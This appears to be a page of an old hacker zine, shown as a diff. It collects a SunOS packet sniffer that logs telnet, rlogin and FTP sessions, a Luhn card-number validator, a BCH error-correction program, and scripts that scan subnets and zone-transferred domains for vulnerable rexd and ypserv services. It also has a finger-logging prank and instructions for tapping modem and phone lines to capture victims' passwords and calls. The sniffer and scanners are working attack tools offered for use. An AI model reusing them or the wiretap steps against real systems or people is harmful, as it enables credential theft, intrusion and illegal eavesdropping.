+     LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
+     while(CLe=CLt) { \
+       CLt=CLe-&gt;Next; \
+       if(CLe-&gt;Time &lt;tm) \
+           END_NODE(CLe,(u_char *)NULL,0,&quot;IDLE TIMEOUT&quot;); \
+     } \
+  } \
+}
+
+void filter(cp, pktlen)
+register char *cp;
+register u_int pktlen;
+{
+ register struct ip     *ip;
+ register struct tcphdr *tcph;
+
+ { register u_short EtherType=ntohs(((struct ether_header *)cp)-&gt;ether_type);
+
+   if(EtherType &lt; 0x600) {
+     EtherType = *(u_short *)(cp + SZETH + 6);
+     cp+=8; pktlen-=8;
+   }
+
+   if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
+      return;
+ }
+
+    /* ugh, gotta do an alignment :-( */
+ bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));
+
+ ip = (struct ip *)Packet;
+ if( ip-&gt;ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
+    return;
+ tcph = (struct tcphdr *)(Packet + IPHLEN);
+
+ if(!( (TCPD == IPPORT_TELNET) ||
+       (TCPD == IPPORT_LOGINSERVER) ||
+       (TCPD == IPPORT_FTP)
+   )) return;
+
+ { register struct CREC *CLm;
+   register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
+   register u_char *p = (u_char *)Packet;
+
+   p += ((IPHLEN * 4) + (TCPOFF * 4));
+
+ if(debug) {
+  fprintf(LOG,&quot;PKT: (%s %04X) &quot;, TCPflags(tcph-&gt;th_flags),length);
+  fprintf(LOG,&quot;%s[%s] =&gt; &quot;, inet_ntoa(IPS),SERVp(TCPS));
+  fprintf(LOG,&quot;%s[%s]\n&quot;, inet_ntoa(IPD),SERVp(TCPD));
+ }
+
+   if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {
+
+      CLm-&gt;PKcnt++;
+
+      if(length&gt;0)
+        if( (CLm-&gt;Length + length) &lt; MAXBUFLEN ) {
+          ADDDATA_NODE( CLm, p,length);
+        } else {
+          END_NODE( CLm, p,length, &quot;DATA LIMIT&quot;);
+        }
+
+      if(TCPFL(TH_FIN|TH_RST)) {
+          END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?&quot;TH_FIN&quot;:&quot;TH_RST&quot; );
+      }
+
+   } else {
+
+      if(TCPFL(TH_SYN)) {
+         ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
+      }
+
+   }
+
+   IDLE_NODE();
+
+ }
+
+}
+
+/* signal handler
+ */
+void death()
+{ register struct CREC *CLe;
+
+    while(CLe=CLroot)
+        END_NODE( CLe, (u_char *)NULL,0, &quot;SIGNAL&quot;);
+
+    fprintf(LOG,&quot;\nLog ended at =&gt; %s\n&quot;,NOWtm());
+    fflush(LOG);
+    if(LOG != stdout)
+        fclose(LOG);
+    exit(1);
+}
+
+/* opens network interface, performs ioctls and reads from it,
+ * passing data to filter function
+ */
+void do_it()
+{
+    int cc;
+    char *buf;
+    u_short sp_ts_len;
+
+    if(!(buf=malloc(CHUNKSIZE)))
+        Pexit(1,&quot;Eth: malloc&quot;);
+
+/* this /dev/nit initialization code pinched from etherfind */
+  {
+    struct strioctl si;
+    struct ifreq    ifr;
+    struct timeval  timeout;
+    u_int  chunksize = CHUNKSIZE;
+    u_long if_flags  = NI_PROMISC;
+
+    if((if_fd = open(NIT_DEV, O_RDONLY)) &lt; 0)
+        Pexit(1,&quot;Eth: nit open&quot;);
+
+    if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_SRDOPT)&quot;);
+
+    si.ic_timout = INFTIM;
+
+    if(ioctl(if_fd, I_PUSH, &quot;nbuf&quot;) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_PUSH \&quot;nbuf\&quot;)&quot;);
+
+    timeout.tv_sec = 1;
+    timeout.tv_usec = 0;
+    si.ic_cmd = NIOCSTIME;
+    si.ic_len = sizeof(timeout);
+    si.ic_dp  = (char *)&amp;timeout;
+    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCSTIME)&quot;);
+
+    si.ic_cmd = NIOCSCHUNK;
+    si.ic_len = sizeof(chunksize);
+    si.ic_dp  = (char *)&amp;chunksize;
+    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCSCHUNK)&quot;);
+
+    strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
+    ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
+    si.ic_cmd = NIOCBIND;
+    si.ic_len = sizeof(ifr);
+    si.ic_dp  = (char *)&amp;ifr;
+    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCBIND)&quot;);
+
+    si.ic_cmd = NIOCSFLAGS;
+    si.ic_len = sizeof(if_flags);
+    si.ic_dp  = (char *)&amp;if_flags;
+    if(ioctl(if_fd, I_STR, (char *)&amp;si) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_STR: NIOCSFLAGS)&quot;);
+
+    if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) &lt; 0)
+        Pexit(1,&quot;Eth: ioctl (I_FLUSH)&quot;);
+  }
+
+    while ((cc = read(if_fd, buf, CHUNKSIZE)) &gt;= 0) {
+        register char *bp = buf,
+                      *bufstop = (buf + cc);
+
+        while (bp &lt; bufstop) {
+            register char *cp = bp;
+            register struct nit_bufhdr *hdrp;
+
+            hdrp = (struct nit_bufhdr *)cp;
+            cp += sizeof(struct nit_bufhdr);
+            bp += hdrp-&gt;nhb_totlen;
+            filter(cp, (u_long)hdrp-&gt;nhb_msglen);
+        }
+    }
+    Pexit((-1),&quot;Eth: read&quot;);
+}
+ /* Authorize your proogie,generate your own password and uncomment here */
+/* #define AUTHPASSWD &quot;EloiZgZejWyms&quot; */
+
+void getauth()
+{ char *buf,*getpass(),*crypt();
+  char pwd[21],prmpt[81];
+
+    strcpy(pwd,AUTHPASSWD);
+    sprintf(prmpt,&quot;(%s)UP? &quot;,ProgName);
+    buf=getpass(prmpt);
+    if(strcmp(pwd,crypt(buf,pwd)))
+        exit(1);
+}
+    */
+void main(argc, argv)
+int argc;
+char **argv;
+{
+    char   cbuf[BUFSIZ];
+    struct ifconf ifc;
+    int    s,
+           ac=1,
+           backg=0;
+
+    ProgName=argv[0];
+
+ /*     getauth(); */
+
+    LOG=NULL;
+    device=NULL;
+    while((ac&lt;argc) &amp;&amp; (argv[ac][0] == '-')) {
+       register char ch = argv[ac++][1];
+       switch(toupper(ch)) {
+            case 'I': device=argv[ac++];
+                      break;
+            case 'F': if(!(LOG=fopen((LogName=argv[ac++]),&quot;a&quot;)))
+                         Zexit(1,&quot;Output file cant be opened\n&quot;);
+                      break;
+            case 'B': backg=1;
+                      break;
+            case 'D': debug=1;
+                      break;
+            default : fprintf(ERR,
+                        &quot;Usage: %s [-b] [-d] [-i interface] [-f file]\n&quot;,
+                            ProgName);
+                      exit(1);
+       }
+    }
+
+    if(!device) {
+        if((s=socket(AF_INET, SOCK_DGRAM, 0)) &lt; 0)
+            Pexit(1,&quot;Eth: socket&quot;);
+
+        ifc.ifc_len = sizeof(cbuf);
+        ifc.ifc_buf = cbuf;
+        if(ioctl(s, SIOCGIFCONF, (char *)&amp;ifc) &lt; 0)
+            Pexit(1,&quot;Eth: ioctl&quot;);
+
+        close(s);
+        device = ifc.ifc_req-&gt;ifr_name;
+    }
+
+    fprintf(ERR,&quot;Using logical device %s [%s]\n&quot;,device,NIT_DEV);
+    fprintf(ERR,&quot;Output to %s.%s%s&quot;,(LOG)?LogName:&quot;stdout&quot;,
+            (debug)?&quot; (debug)&quot;:&quot;&quot;,(backg)?&quot; Backgrounding &quot;:&quot;\n&quot;);
+
+    if(!LOG)
+        LOG=stdout;
+
+    signal(SIGINT, death);
+    signal(SIGTERM,death);
+    signal(SIGKILL,death);
+    signal(SIGQUIT,death);
+
+    if(backg &amp;&amp; debug) {
+         fprintf(ERR,&quot;[Cannot bg with debug on]\n&quot;);
+         backg=0;
+    }
+
+    if(backg) {
+        register int s;
+
+        if((s=fork())&gt;0) {
+           fprintf(ERR,&quot;[pid %d]\n&quot;,s);
+           exit(0);
+        } else if(s&lt;0)
+           Pexit(1,&quot;fork&quot;);
+
+        if( (s=open(&quot;/dev/tty&quot;,O_RDWR))&gt;0 ) {
+                ioctl(s,TIOCNOTTY,(char *)NULL);
+                close(s);
+        }
+    }
+    fprintf(LOG,&quot;\nLog started at =&gt; %s [pid %d]\n&quot;,NOWtm(),getpid());
+    fflush(LOG);
+
+    do_it();
+}
+
+
+------------------------------------------------------------------------------
+
+#! /bin/nawk -f
+# validcc.awk - validate credit card #
+{
+ # validate CardNo
+ number=&quot;&quot;
+ CardNo = $0
+ for (indig = 1; indig &lt;= length(CardNo); indig++) {
+  dig = substr(CardNo, indig, 1)
+  if (dig ~ /^[0-9]$/)
+   number = number dig
+  else if (dig != &quot; &quot;) {
+   print &quot;bad character in CardNo&quot; | &quot;cat &gt;&amp;2&quot;
+   break
+  }
+ }
+ digit1 = substr(number, 1, 1)
+ cclen = length(number)
+ if (digit1 == &quot;3&quot;) {
+  print &quot;Sorry, we do not take American Express&quot; | &quot;cat &gt;&amp;2&quot;
+#  if (cclen != 15)
+#   print &quot;wrong length for CardNo&quot; | &quot;cat &gt;&amp;2&quot;
+ } else if (digit1 == &quot;4&quot;) { # visa
+  if (cclen != 13 &amp;&amp; cclen != 16)
+   print &quot;wrong length for CardNo&quot; | &quot;cat &gt;&amp;2&quot;
+ } else if (digit1 == &quot;5&quot;) { # master card
+  if (cclen != 16)
+   print &quot;wrong length for CardNo&quot; | &quot;cat &gt;&amp;2&quot;
+ } else
+  print &quot;unknown credit card&quot; | &quot;cat &gt;&amp;2&quot;
+ if (cclen == 13)
+  bias = 0
+ else
+  bias = 1
+ for (llen = 1; llen &lt;= cclen; llen++) {
+  cdigit = digit = substr(number, llen, 1)
+  if (((llen-1+bias)%2) == 1) # double every second digit
+   cdigit *= 2
+  if (cdigit &gt; 9)
+   cdigit -= 9 # compensate ...
+  csum += cdigit  # ... add up all the digits
+ }
+ if ((csum%10) != 0)
+  print &quot;bad CardNo&quot; | &quot;cat &gt;&amp;2&quot;
+}
+
+------------------------------------------------------------------------------
+
+/* File: bch2.c
+
+     ======  Encoder/Decoder of binary primitive BCH codes ======
+
+     Robert Morelos-Zaragoza,     University of Hawaii     5/19/92
+
+    This program computes the generator polynomial of the code by
+    using cycle sets modulo n, n = 2^m - 1.
+
+   (Part of this program is adapted from a Reed-Solomon encoder/decoder
+    program, 'rs.c', for the binary case.    rs.c was created by Simon
+    Rockliff, University of Adelaide   21/9/89)
+
+   Main variables:
+
+   m = order of the field GF(2**m)
+   n = 2**m - 1 = length
+   t = error correcting capability
+   d = 2*t + 1 = designed minimum distance
+   k = n - deg(g(x)) = dimension
+
+   p[] = primitive polynomial to generate GF(2**m)
+   (read from least to most significant coefficient)
+
+   g[] = generator polynomial
+
+   alpha_to [] = log table in GF(2**m)
+   index_of[] = antilog table in GF(2**m)
+   data[] = data polynomial
+   bb[] = redundancy polynomial = x**(n-k) data[] modulo g[]
+
+   numerr = number of errors
+   errpos[] = error positions
+
+   recd[] = received polynomial
+   decerror = number of decoding errors ( in MESSAGE positions)
+
+*/
+
+#include &lt;math.h&gt;
+#include &lt;stdio.h&gt;
+
+int m, n, k, t, d ;
+int p [20] ; /* irreducible polynomial */
+int alpha_to [1024], index_of [1024], g [1024] ;
+int recd [1024], data [1024], bb [1024] ;
+int numerr, errpos [1024], decerror = 0 ;
+int seed;
+
+
+
+void read_p()
+/* Read primitive polynomial of degree m */
+  {
+ register int i;
+
+    printf(&quot;Enter m and primitive polynomial p(x): &quot;);  scanf(&quot;%d&quot;, &amp;m);
+    for (i=0; i&lt;=m; i++)
+        scanf(&quot;%d&quot;, &amp;p[i]);
+    printf(&quot;p(x) = &quot;);
+    for (i=0; i&lt;=m; i++)
+        printf(&quot;%1d&quot;, p[i]);
+    printf(&quot;\n&quot;);
+    n = (int)(pow(2.0,(double) m)) - 1;
+ }
+
+
+
+void generate_gf()
+/* generate GF(2**m) from the irreducible polynomial p(X) in p[0]..p[m]
+   lookup tables:  index-&gt;polynomial form   alpha_to[] contains j=alpha**i;
+                   polynomial form -&gt; index form  index_of[j=alpha**i] = i
+   alpha=2 is the primitive element of GF(2**m)
+*/
+ {
+   register int i, mask ;
+
+  mask = 1 ;
+  alpha_to[m] = 0 ;
+  for (i=0; i&lt;m; i++)
+   { alpha_to[i] = mask ;
+     index_of[alpha_to[i]] = i ;
+     if (p[i]!=0)
+       alpha_to[m] ^= mask ;
+     mask &lt;&lt;= 1 ;
+   }
+  index_of[alpha_to[m]] = m ;
+  mask &gt;&gt;= 1 ;
+  for (i=m+1; i&lt;n; i++)
+   { if (alpha_to[i-1] &gt;= mask)
+        alpha_to[i] = alpha_to[m] ^ ((alpha_to[i-1]^mask)&lt;&lt;1) ;
+     else alpha_to[i] = alpha_to[i-1]&lt;&lt;1 ;
+     index_of[alpha_to[i]] = i ;
+   }
+  index_of[0] = -1 ;
+ }
+
+
+void gen_poly()
+/* Compute generator polynomial of BCH code of length n=2^m - 1 */
+ {
+    register int ii, jj, ll, kaux;
+    int test, aux, nocycles, root, noterms, rdncy;
+    int cycle[256][11], size[256], min[128], zeros[256];
+
+/* Generate cycle sets modulo n, n = 2^m - 1 */
+    cycle[0][0] = 0; size[0] = 1;
+    cycle[1][0] = 1; size[1] = 1;
+    jj = 1;    /* cycle set index */
+    printf(&quot;Computing cycle sets modulo %d ...\n&quot;, n);
+    do
+      {
+      /* Generate the jj-th cycle set */
+      ii = 0;
+      do
+        {
+        ii++;
+        cycle[jj][ii] = (cycle[jj][ii-1]*2) % n;
+        size[jj]++;
+        aux = (cycle[jj][ii]*2) % n;
+        } while ( aux != cycle[jj][0] );
+      printf(&quot; %d &quot;, jj);
+      if (jj &amp;&amp; ( (jj % 10) == 0)) printf(&quot;\n&quot;);
+      /* Next cycle set representative */
+      ll = 0;
+      do
+        {
+        ll++;
+        test = 0;
+        for (ii=1; ((ii&lt;=jj) &amp;&amp; (!test)); ii++)/* Examine previous cycle
+sets */
+          for (kaux=0; ((kaux&lt;size[ii]) &amp;&amp; (!test)); kaux++)
+            if (ll == cycle[ii][kaux]) test = 1;
+        } while ( (test) &amp;&amp; (ll&lt;(n-1)) );
+      if (!(test))
+        {
+        jj++;   /* next cycle set index */
+        cycle[jj][0] = ll;
+        size[jj] = 1;
+        }
+      } while (ll &lt; (n-1));
+    printf(&quot; ... Done\n&quot;);
+    nocycles = jj; /* number of cycle sets modulo n */
+#ifdef DEBUG
+    printf(&quot;Cycle sets modulo %d:\n&quot;, n);
+    for (ii=0; ii&lt;=nocycles; ii++) {
+      for (jj=0; jj&lt;size[ii]; jj++)
+        printf(&quot;%d &quot;,cycle[ii][jj]);
+      printf(&quot;\n&quot;); }
+#endif
+
+    printf(&quot;Enter t: &quot;);  scanf(&quot;%d&quot;, &amp;t);
+    d = 2*t+1;
+    /* Search for roots 1, 2, ..., d-1 in cycle sets */
+    kaux = 0;
+    rdncy = 0;
+    for (ii=1; ii&lt;=nocycles; ii++)
+      {
+      min[kaux] = 0;
+      for (jj=0; jj&lt;size[ii]; jj++)
+        for (root=1; root&lt;d; root++)
+          if (root == cycle[ii][jj])
+            min[kaux] = ii;
+      if (min[kaux])
+        {
+        rdncy += size[min[kaux]];
+        kaux++;
+        }
+      }
+    noterms = kaux;
+#ifdef DEBUG
+printf(&quot;roots: &quot;, noterms);
+#endif
+    kaux = 1;
+    for (ii=0; ii&lt;noterms; ii++)
+      for (jj=0; jj&lt;size[min[ii]]; jj++)
+        {
+        zeros[kaux] = cycle[min[ii]][jj];
+#ifdef DEBUG
+printf(&quot;%d &quot;, zeros[kaux]);
+#endif
+        kaux++;
+        }
+    k = n - rdncy;
+    printf(&quot;This is a (%d, %d, %d) binary BCH code\n&quot;, n, k, d);
+
+
+------------------------------------------------------------------------------
+
+#!/bin/perl -s
+#
+#   Scan a subnet for valid hosts; if given hostname, will look at the
+# 255 possible hosts on that net.  Report if host is running rexd or
+# ypserv.
+#
+#  Usage:  scan n.n.n.n
+
+# mine, by default
+$default = &quot;130.80.26&quot;;
+
+$| = 1;
+
+if ($v) { $verbose = 1; }
+
+if ($#ARGV == -1) { $root = $default; }
+else { $root = $ARGV[0]; }
+
+# ip address
+if ($root !~ /[0-9]+\.[0-9]+\.[0-9]+/) {
+        ($na, $ad, $ty, $le, @host_ip) = gethostbyname($root);
+        ($one,$two,$three,$four) = unpack('C4',$host_ip[0]);
+        $root = &quot;$one.$two.$three&quot;;
+        if ($root eq &quot;..&quot;) { die &quot;Can't figure out what to scan...\n&quot;; }
+        }
+
+print &quot;Subnet $root:\n&quot; if $verbose;
+for $i (01..255) {
+        print &quot;Trying $root.$i\t=&gt; &quot; if $verbose;
+        &amp;resolve(&quot;$root.$i&quot;);
+        }
+
+#
+#  Do the work
+#
+sub resolve {
+
+local($name) = @_;
+
+# ip address
+if ($name =~ /[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/) {
+        ($a,$b,$c,$d) = split(/\./, $name);
+        @ip = ($a,$b,$c,$d);
+        ($name) = gethostbyaddr(pack(&quot;C4&quot;, @ip), &amp;AF_INET);
+        }
+else {
+        ($name, $aliases, $type, $len, @ip) = gethostbyname($name);
+        ($a,$b,$c,$d) = unpack('C4',$ip[0]);
+        }
+
+if ($name &amp;&amp; @ip) {
+        print &quot;$a.$b.$c.$d\t$name\n&quot;;
+        system(&quot;if ping $name 5 &gt; /dev/null ; then\nif rpcinfo -u $name 100005 &gt; /dev/null ; then showmount -e $name\nfi\nif rpcinfo -t $name 100017 &gt; /dev/null ; then echo \&quot;Running rexd.\&quot;\nfi\nif rpcinfo -u $name 100004 &gt; /dev/null ; then echo \&quot;R
+unning ypserv.\&quot;\nfi\nfi&quot;);
+        }
+else { print &quot;unable to resolve address\n&quot; if $verbose; }
+
+}
+
+sub AF_INET {2;}
+
+
+------------------------------------------------------------------------------
+
+#!/bin/sh
+#rpc.chk 1.0
+#
+# Make sure you have got a newer version of Bourne Shell (SVR2 or newer)
+# that supports functions. It's usually located in /bin/sh5 (under ULTRIX OS)
+# or /bin/sh (Sun OS, RS/6000 etc) If it's located elsewhere, feel free to
+# change the magic number, indicating the type of executable Bourne Shell.
+#
+# The script obtains via nslookup utility a list of hostnames from a nameserver
+# and checks every entry of the list for active rexd procedures as well as
+# ypserver procedures. The output is a list of the sites that run those
+# daemons and are insecure.
+# -yo.
+
+
+domainname=$1
+umask 022
+PATH=/bin:/usr/bin:/usr/ucb:/usr/etc:/usr/local/bin ; export PATH
+
+#
+# Function collects a list of sites
+# from a nameserver. Make sure you've got the nslookup utility.
+#
+get_list() {
+(
+echo set type=ns
+echo $domainname
+) | nslookup | egrep &quot;nameserv&quot; | cut -d= -f2&gt; .tmp$$  2&gt;/dev/null
+if [ ! -s .tmp$$ ]; then
+echo &quot;No such domain&quot; &gt;&amp;2
+echo &quot;Nothing to scan&quot; &gt;&amp;2
+exit 1
+fi
+for serv in `cat .tmp$$`;do
+(
+echo server $serv
+echo ls  $domainname
+) | nslookup &gt; .file$$ 2&gt;/dev/null
+lines=`cat .file$$ | wc -l`
+tail -`expr $lines  - 7` .file$$  | cut -d&quot; &quot; -f2 &gt; .file.tmp # .file
+sed -e &quot;s/$/.$domainname/&quot;  .file.tmp &gt; .hosts$$
+rm -rf .file* .tmp$$
+sort .hosts$$ | uniq -q &gt;&gt; HOSTS$$; rm -rf .hosts$$
+done
+tr 'A-Z' 'a-z' &lt;HOSTS$$ |sort|uniq -q &gt; HOSTS.$domainname;rm -rf HOSTS$$
+}
+
+# Function
+
+rpc_calls()
+{
+for entry in `cat HOSTS.$domainname`; do
+(
+rpcinfo -t $entry ypserv &gt;/dev/null  &amp;&amp; echo $entry runs YPSERV ||  exit 1 # Error!
+) &gt;&gt; .log  2&gt;/dev/null
+(
+rpcinfo -t $entry rex &gt;/dev/null &amp;&amp; echo $entry runs REXD ||  exit 1 # Error !
+ ) &gt;&gt; .log  2&gt;/dev/null
+done
+}
+
+# Main
+
+if [ &quot;$domainname&quot; = '' ];  then
+echo &quot;Usage $0 domainname&quot; &gt;&amp;2
+exit 1
+fi
+get_list
+echo &quot;Checking $domainname domain&quot; &gt; .log
+echo &quot;*****************************&quot; &gt;&gt; .log
+echo &quot;Totally `cat HOSTS.$domainname | wc -l` sites  to scan&quot; &gt;&gt; .log
+echo &quot;******************************&quot; &gt;&gt; .log
+echo &quot;started at `date`&quot; &gt;&gt; .log
+echo &quot;******************************&quot; &gt;&gt; .log
+rpc_calls
+echo &quot;******************************&quot; &gt;&gt; .log
+echo &quot;finished at `date`&quot;  &gt;&gt; .log
+
+------------------------------------------------------------------------------
+
+                         The Ultimate Finger/Mail Hack
+
+                                      by
+
+                                    Emanon
+
+                              (a.k.a. WinterHawk)
+
+
+This program will keep a log of who fingers you on your local host and tell
+you when the finger was performed. As an added tease, it will send email to
+the person doing the fingering telling them that you know who they are and
+you know when they fingered you, even when you are not logged on.
+
+Easy to follow steps:
+
+[This is a comment]
+
+[ALL OF THE FOLLOWING FILES ARE TO GO IN YOUR HOME DIRECTORY!!!]
+
+[Get to your home directory]
+% cd
+
+[Make a file called .mailscript and include the following source code]
+[MAKE THE APPROPRIATE CHANGES TO PATH NAMES WHERE NECESSARY!!!]
+% cat .mailscript
+#!bin/sh
+MYNAME=your_account_name # JUST YOUR LOCAL ACCOUNT NAME, NOT THE FULL ADDRESS!!!
+HOME=/your/full/home/path/goes/here
+SUCKER=`ps -fau | grep 'finger $MYNAME' | grep -v 'grep' | awk '{print $1}'`
+echo &quot;$SUCKER fingered you on `date`&quot; | cat &gt;&gt; $HOME/.fingerlog
+echo &quot;$MYNAME knows that you fingered him on `date`&quot; | mail -s 'Sucker!' $SUCKER
+
+[On some systems, the `u' flag is not necessary for the `ps' command]
+[On most systems, you will not have to (re)declare the $HOME variable]
+[If you do not want the fingerer to receive email, remove the last line]
+[You may wish to hard code your account name, rather than using the variable]
+
+[Make a file called fingerLog.c and include the following source code]
+[MAKE THE APPROPRIATE CHANGES TO PATH NAMES WHERE NECESSARY!!!]
+% cat fingerLog.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/file.h&gt;
+main()
+{
+   int x, pipeHandle, planHandle;
+   char * pipeFile = &quot;/your/full/home/path/goes/here/.plan&quot;;
+   char * planFile = &quot;/your/full/home/path/goes/here/.realplan&quot;;
+   char buf[1024];
+   for(;;){
+      pipeHandle=open(pipeFile,O_WRONLY);
+      planHandle=open(planFile,O_RDONLY);
+      while((x=read(planHandle,buf,sizeof(buf)))&gt;0)
+         write(pipeHandle,buf,x);
+      system(&quot;sh /your/full/home/path/goes/here/.mailscript&quot;);
+      close(pipeHandle);
+      close(planHandle);
+      sleep(3);}
+}
+
+[Compile the fingerLog.c program]
+% cc fingerLog.c -o fingerLog
+
+[You may want to use a more inconspicuous name for the executable file]
+
+[Move you .plan file to .realplan]
+% mv .plan .realplan
+
+[Make a piped FIFO .plan file]
+% mknod .plan p
+
+[Allow people to view your bogus .plan file]
+% chmod 755 .plan
+
+[Run fingerLog in the background]
+% nohup fingerLog &gt; /dev/null &amp;
+
+[Optional clean up]
+% rm fingerLog.c
+
+PROBLEMS: On some machines, the [ps -fau] option will not reveal what account
+          a person is actually fingering. In this case, you can remove all
+          instances of the $MYNAME variable from the [.mailscript] file.
+          However, it is entirely possible that two people may be performing a
+          finger at the same time and the script may log the wrong one. If you
+          do have to omit the $MYNAME variable, I strongly suggest that you
+          also remove the email option. And, you might as well change the [ps]
+          command to a simple [w], like so:
+
+          SUCKER=`w | grep 'finger' | grep -v 'grep' | awk '{print $1}'`
+
+          Also, if the system you are on is bogged down with a lot of
+          processes, the script may not find the fingerer before the process
+          is terminated, thus logging the time without an appropriate account
+          name, and not sending the email. So far, there has only been one
+          system where I could only use the program to log the times that I
+          had been fingered, no account names and no email :(
+
+That's It! Of course, this is not a perfect bug free program. It should run
+all the time [even when you are not logged on] so you only need to run it
+once. If it does quit for some reason [like when the sysop kills it], you can
+simply restart it. For those of you privileged enough to be using Korn shell,
+you can add the following code to your [.profile] that will check to see if
+fingerLog is running whenever you log in. If it isn't, it will restart it for
+you. I'm sure that this can be modified to work with Bourne and C shell (if it
+doesn't already), but I'll leave that up to you.
+
+ps x | grep 'fingerLog' | grep -v 'grep' &gt; /dev/null
+if (( $? != 0 )); then nohup fingerLog &gt; /dev/null &amp;
+fi
+
+Let me say this one more time so that there is no confusion, &quot;This only works
+on your LOCAL host!!!&quot; People who finger you from a remote host will see your
+[.realplan] file, just like everyone else, but they will *NOT* receive the
+email. It will appear in your .fingerlog as an empty account name. If and when
+someone does revise this to work with remote hosts (most likely using the
+netstat command), please email me a copy at:
+
+tdavis@garnet.acns.fsu.edu
+
+As a matter of fact, there is a lot of room for improvement. If *ANYONE* makes
+*ANY* revisions, please have the courtesy to email me a copy and explain what
+changes you have made. Thanks. Enjoy!
+
+Assembly: WinterHawk bows humbly to Cat and Fuzz.
+
+------------------------------------------------------------------------------
+
+                     +----------------------+
+                     | Building A Modem Tap |
+                     | by: phigan           |
+                     +----------------------+
+
+        Many of you have probably heard of, seen, or maybe even built a
+phone tap. Not a very difficult device to make. I got the idea of making
+a modem tap from a computer underground book that I saw over at my local
+Spy Headquarters (I'm not sure if this is a store that is only here in
+602 or not but its got shitloads of spy equipment such as video
+surveillance, fake ids, useful literature, fake bombs, very small bugs,
+etc.).  First of all, here is the schematic for making a phone tap to
+record to cassette.
+
+Parts
+~~~~~
+1) RCA-type jack
+   to tape recorder
+   mic input
+1) 10k(p)ohm : 20k(s) ohm
+   transformer
+1) .005 mfd capacitor
+
+Schematic
+~~~~~~~~~
+                                      To line
++--------------------------+          |     |
+|                          |          |     |
+(+-----------+             |          |     |
+RCA          | Transformer |          |     |
+jack         +^^^^^^^^^^^^^+          |     |
+             +-------------+          |     |
+             |             |          |     |
+             |             +----------------+
+             |                        |     |
+             +----------||------------+     |
+                     .005 mfd         |     |
+
+        The main purpose for a modem tap such as this is to set it up at
+someone's house or maybe an office building that you know dials out with
+modems and you can record all the keystrokes that have been entered.
+With this next schematic, you can simply play the cassette back through
+your modem and easily print out the entire session having logged
+passwords and so on. Good way of getting CBI accounts also.
+
+Parts
+~~~~~
+1) RCA type jack
+   from tape recorder
+   ext. speaker
+1) 100 Ohm restistor
+1) bell-type phone jack (@)
+
+Schematic
+~~~~~~~~~
+
+    +-------+       ____________________   RCA jack
+----| Modem | @----&lt;_________/\/\/\_____&gt;(+
+    +-------+ phone          100 Ohm
+              jack
+
+        When you have a recording of your victim's session, simply fire
+up your terminal program and treat it as you would any other modem
+connection. If you are smart enough, you may even be able to combine
+these two and make an acoustic modem module for a regular laptop modem
+(hint hint payphones hint hint). I have seen this done in a mail-order
+mag.
+It said that the acoustic module could handle 9600 baud and if you have
+good
+enough rubber cups (like they did on their model) then you will
+have absolutely no line noise. Anyway, if you have any problems, feel
+free to email me at 15660@ef.gc.maricopa.edu or you may find me on IRC
+as phigan on channels #phreak, #hack, or sometimes #c-64.
+
+
+                      ,,,
+                     (o o)
+.---------------oOO---(_)---OOo---------------.
+| PHiGAN/6o2              IBM/Amiga/8-Bit     |
+| ANSi/VGA/Coding         Member: NWPAC       |
+| Hi-Res/8-Bit/Musix      SysOp:              |
+| 15660@ef.gc.maricopa.edu -The PhAcS Machine |
+`---------------------------------------------'
+
+
+------------------------------------------------------------------------------
+
+                  Phone Tapping with a personal stereo !!!
+                             brought to you by
+
+                                 Harlequin
+
+        Here in the UK, we have a reasonably secure phone system, mainly
+because the whole system is run by our beloved phone company British
+Telecom, even the private phone companies have to rent their lines off BT.
+
+        BUT, due to something or other I don't entirely understand here's
+how to listen in to phone conversations with a personal stereo.
+
+        I was lying in bed one night trying desperately to read my book,
+while everyone else was making enough noise to wake the dead. So, I
+thought, I'll put personal stereo radio onto some radio crackle to cut out
+everything else. I was happily reading for a while when suddenly the radio
+crackle was interrupted by 'ring ring, ring ring, 'ello Jon, going into
+work tomorrow ? Good, how's the wife.... etc etc' Fuck me ! A telephone
+conversation. After a bit of investigating I discovered my bed lies next
+to where the telephone line goes thru the wall.
+
+        What I did was to tune the radio into an AM frequency, as far to
+the right (past 1600 kHz) as possible. This works on my personal stereo, a
+Sharp, model JC-512(GY), my clock radio and my mates pocket radio, but not
+on some other radios we've tried. It picks up local telephone calls (if
+there are any strong enough to be picked up) when the radio is put near a
+telephone socket or line (the closer the better). Computer monitors and
+TV's give loads of interference (try putting your the radio near one when
+tuned to listen for phones) so keep away from them.
+
+        You can't choose what calls to listen in on, and some may be
+blurred beyond recognition, while others are crystal clear. Also,
+strangely enough if someone in the house uses the phone while your
+listening to conversations it doesn't effect it in any way, and you can't
+hear the call currently on the line.
+
+        Not being an electronics hacker I can only assume it is to do with
+the frequency of radio waves given off by electrical devices after a
+certain distance travelled. But then again maybe not.
+
+        This may work in other places apart from the UK as well, give it a
+try !</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
